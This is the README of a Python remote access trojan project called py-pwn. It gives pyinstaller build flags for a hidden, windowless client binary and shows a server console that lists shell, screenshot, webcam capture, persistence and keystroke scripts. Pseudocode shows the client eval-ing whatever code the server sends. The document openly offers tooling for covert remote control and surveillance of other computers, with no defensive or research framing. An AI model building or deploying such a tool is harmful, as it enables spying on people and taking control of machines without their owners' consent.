# py-pwn

> A super simple Python-based [RAT](https://www.geeksforgeeks.org/introduction-to-rat-remote-administration-tool/).

## Usage

1. Create `config.py` and update `PORT` in `server.py`

```python
config = {"uri": "ws://<your server ip>:<your port>", "imgur_key": "<your imgur api key here>"}
```

2. `$ pyinstaller --noconsole --onefile --hidden-import=pyscreenshot --hidden-import=pyimgur --hidden-import=cv2 --hidden-import=pyautogui client.py`

3. Double click the generated binary on a client computer while the server is running `server.py`.

4. Use the server to interactively control clients.

```
> scripts
type
say
ping
kill
shell
screenshot
msg_box
camshot
open_url
persist
> list
0 127.0.0.1/DESKTOP-ABC123/0
> interact 0
[127.0.0.1/DESKTOP-ABC123/0] >> open_url("https://www.youtube.com/watch?v=YddwkMJG1Jo")
```

5. _While_ the server is running you can add/edit scripts in [/scripts](https://github.com/sshh12/py-pwn/tree/master/scripts).

## How It Works

_As pseudo code..._

### Client

```python
conn = connect_to_server_websocket()
while True:
    script, args = conn.read()
    eval(script)(args)
```

### Server

```python
server = run_websocket_server()
while True:
    cmd = input(' > ')
    script_name, args = parse(cmd)
    server.send_to_selected_client(read_file(script_name), args)
```
